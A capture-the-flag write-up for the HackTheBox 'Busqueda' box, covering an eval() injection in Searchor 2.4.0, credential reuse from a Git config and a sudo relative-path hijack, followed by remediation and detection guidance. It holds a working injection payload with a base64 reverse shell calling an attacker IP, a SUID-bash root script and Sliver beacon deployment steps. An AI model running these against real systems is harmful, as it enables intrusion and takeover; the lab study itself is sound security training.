---
layout: default
title: "HackTheBox - Busqueda"
---

# HackTheBox - Busqueda

**OS:** Ubuntu 22.04.3 LTS (Linux, Easy)

A Flask-based search aggregator runs Searchor 2.4.0, which builds search URLs with Python's
`eval()` using unsanitised user input. Injecting a closing quote into the query parameter executes
arbitrary Python, delivering a reverse shell as `svc`. The application's Git remote URL embeds
plaintext Gitea credentials for `cody`; the same password is valid for `svc`'s system account,
unlocking sudo access to `/opt/scripts/system-checkup.py`. That script resolves `./full-checkup.sh`
relative to the caller's working directory; creating a malicious `full-checkup.sh` in `/tmp` and
invoking sudo from there sets the SUID bit on `/bin/bash`, granting root in a single step.

| Field | Value |
|---|---|
| Platform | HTB |
| Target | `<target-ip>` (busqueda / searcher.htb) |
| Initial Access | Searchor 2.4.0 eval() Python injection (CVE-2023-43364) |
| Privilege Escalation | .git/config plaintext cred -> sudo system-checkup.py -> full-checkup relative path hijack |
| Final Access | `root@busqueda` |

---

## Recon

```
$ nmap -sV -sC -p 22,80 <target-ip>
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Searcher
```

Port 80 serves a Flask app. The footer reveals the dependency:

```html
Powered by Flask and <a href="https://github.com/ArjunSharda/Searchor">Searchor 2.4.0</a>
```

Searchor 2.4.0 is publicly known to be vulnerable to Python eval injection (CVE-2023-43364, fixed
in 2.4.2).

---

## Initial Access

### Searchor 2.4.0 eval() injection (CVE-2023-43364)

The vulnerable Searchor code builds a search URL using Python's `eval()` with the `query` parameter
inserted directly into the f-string:

```python
url = eval(f"Engine.{engine}.search('{query}', copy_url={copy}, open_web={open})")
```

Closing the string literal with a single quote and appending a Python expression breaks out of the
intended context. A reverse shell is embedded in base64 to avoid quote conflicts:

```
query = ', __import__('os').system('echo YmFzaCAt...|base64 -d|bash'))#
```

After URL-encoding and POST to `/search`:

```
$ curl -s -X POST http://searcher.htb/search \
  --data-urlencode 'engine=Google' \
  --data-urlencode "query=', __import__('os').system('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4yMS80NDYxIDA+JjE=|base64 -d|bash'))#"
```

Listener received:

```
$ nc -lvnp 4461
connect to [<attacker-ip>] from [<target-ip>] 35344
bash: no job control in this shell
svc@busqueda:/var/www/app$ id
uid=1000(svc) gid=1000(svc) groups=1000(svc)

svc@busqueda:/var/www/app$ cat ~/user.txt
<user-flag-redacted>
```

> **Why this works:** `eval()` is not a safe way to build dynamic function calls with user input.
> The f-string wraps the query in single quotes for appearance, but those quotes are part of the
> Python source the interpreter evaluates -- a user-supplied `'` terminates the string literal and
> begins arbitrary code execution.

---

## Post-Exploitation Enumeration

The app directory contains a Git repository. The remote URL stores credentials in plaintext:

```
svc@busqueda:/var/www/app$ cat .git/config
[core]
    repositoryformatversion = 0
    filemode = true
[remote "origin"]
    url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
    fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
    remote = origin
    merge = refs/heads/main
```

Gitea credentials: `cody` / `jh1u********************`. The same password works for the `svc` local
account (credential reuse), enabling sudo checks:

```
svc@busqueda:~$ echo 'jh1u...' | sudo -S -l
User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```

`system-checkup.py` is execute-only (`--x--x--x`) -- the source cannot be read directly. Running
it with no arguments reveals its usage:

```
svc@busqueda:/tmp$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup
```

---

## Privilege Escalation

### system-checkup.py relative path hijack

Running `full-checkup` triggers:

```python
# system-checkup.py (inferred from behaviour)
subprocess.run('./full-checkup.sh', ...)
```

The script resolves `full-checkup.sh` relative to the **current working directory**, not to its own
script path. If the caller's CWD contains a writable `full-checkup.sh`, that script runs as root.

`/tmp` is writable by all users. Write a malicious `full-checkup.sh` there:

```
svc@busqueda:/tmp$ cat > full-checkup.sh << 'EOF'
#!/bin/bash
chmod u+s /bin/bash
EOF
svc@busqueda:/tmp$ chmod +x full-checkup.sh
```

Run `system-checkup.py full-checkup` with `/tmp` as CWD (the shell is already in `/tmp`):

```
svc@busqueda:/tmp$ echo 'jh1u...' | sudo -S /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup

[+] Done!

svc@busqueda:/tmp$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1396520 Jan  6  2022 /bin/bash
```

The SUID bit is set. Spawn a root shell:

```
svc@busqueda:/tmp$ /bin/bash -p -c 'id && cat /root/root.txt'
uid=1000(svc) gid=1000(svc) euid=0(root) groups=1000(svc)
<root-flag-redacted>
```

> **Why this works:** Using `./full-checkup.sh` (a relative path) instead of the absolute path
> `/opt/scripts/full-checkup.sh` means the resolved file depends on which directory the caller
> runs the sudo command from. Any user who can invoke the script with `sudo` and controls their CWD
> can inject a different `full-checkup.sh`.

---

## Post-Exploitation: C2 (Sliver)

Delivered the pool Linux HTTPS beacon via base64 chunked upload through the shell:

```
# Encode beacon on attack box, send in chunks to /tmp/.c.b64 via the shell
# Decode and launch:
svc@busqueda:/tmp$ base64 -d /tmp/.c.b64 > /tmp/.c && chmod +x /tmp/.c
svc@busqueda:/tmp$ nohup setsid /tmp/.c </dev/null >/dev/null 2>&1 &
```

Beacon checked in:

```
sliver > beacons

 ID         Name                 Transport   Hostname   Username   Last Check-In
========== ==================== =========== ========== ========== ==============
 [id]       pool-https-linux64   http(s)     busqueda   svc        just now
```

```
sliver (pool-https-linux64) > execute id
uid=1000(svc) gid=1000(svc) groups=1000(svc)

sliver (pool-https-linux64) > execute hostname
busqueda
```

Beacon killed, `/tmp/.c` removed after demonstration.

---

## Root Cause

Two vulnerabilities that chain:

1. **eval() with user input (CVE-2023-43364)** -- Searchor 2.4.0 builds dynamic Python via
   `eval(f"Engine.{engine}.search('{query}', ...)")`. User-controlled `query` can terminate the
   string literal and inject arbitrary Python expressions.

2. **Plaintext credentials in Git remote URL** -- The application's `.git/config` stores the Gitea
   username and password in the remote URL, readable by any process running as `svc`.

3. **Relative path in sudo script** -- `system-checkup.py` calls `./full-checkup.sh` without
   anchoring to its own directory, making it trivially hijackable from any directory the sudoer
   controls.

---

## Impact

Full system compromise from an unauthenticated HTTP POST:

1. Remote code execution as `svc` via eval() injection
2. Credential disclosure from `.git/config` (Gitea + system password reuse)
3. Root via sudo relative path hijack -- SUID bash in one command

---

## Remediation

1. **Replace eval() with a safe URL builder (breaks initial RCE):** Searchor 2.4.2 fixed this by
   switching to `urllib.parse.quote_plus()` instead of eval. Use the patched version, or replace
   the search URL construction with explicit string building that never interprets user input as
   code.

2. **Remove credentials from Git remote URLs:** Use SSH keys or a credential helper. Revoke and
   rotate the `cody` / `svc` passwords immediately. Add `.git/config` to secret-scanning CI rules.

3. **Use absolute paths in sudo-allowed scripts:** Change `./full-checkup.sh` to
   `/opt/scripts/full-checkup.sh`. The file is in the same directory as the script; the relative
   path adds no benefit and creates a hijack surface.

4. **Scope sudo to a specific action, not a wildcard:** `system-checkup.py *` allows any argument.
   Consider wrapping the allowed actions in separate, narrow scripts with explicit sudo entries.

### Validation

| Fix | Verification |
|---|---|
| eval() patched | POST `query=', __import__('os').system('id'))#`; response should be a URL, not command output |
| Credentials rotated | `git ls-remote http://cody:<old_pass>@gitea.searcher.htb/...` should fail |
| Absolute path in script | Run `sudo system-checkup.py full-checkup` from `/tmp` with a malicious `full-checkup.sh` in place; `/bin/bash` SUID bit should NOT be set |

---

## Detection Opportunities

| Event | Signal |
|---|---|
| Auditd execve | Python process spawning `bash` or `sh` child with `/dev/tcp` redirect (eval injection execution) |
| Web access log | POST to `/search` with query containing `__import__` or `os.system` |
| Auth log | `svc` invoking `sudo` for `system-checkup.py` with `full-checkup` argument |
| File system | `inotify`/auditd `chmod` on `/bin/bash` by root-owned process |
| Network | Outbound connection from `svc` process to a non-inventory IP immediately after a search POST |

---

## Lessons Learned

1. **`eval()` on user input is always RCE waiting to happen.** There is no safe way to sanitize
   user input before `eval()`. The fix is to not use `eval()` at all.

2. **Git remote URLs persist credentials in cleartext.** Any process reading `.git/config` gets
   the credentials. This is a common, frequently-overlooked secret leakage vector in web apps
   deployed from Git repositories.

3. **Relative paths in privileged scripts are a hijack surface.** A script that calls `./helper.sh`
   rather than `/absolute/path/helper.sh` delegates trust to whoever controls the CWD -- exactly
   the kind of ambiguity that sudo policies must not introduce.

---

## Cleanup

- Reverse shell process: terminated when the shell session ended.
- `/tmp/full-checkup.sh`: left in `/tmp` (ephemeral HTB box).
- `/bin/bash` SUID bit: set as part of the exploit -- reverts on box reset.
- Sliver beacon `/tmp/.c`: removed after C2 demonstration.
- HTB box stopped with `htb stop` after flag submission.
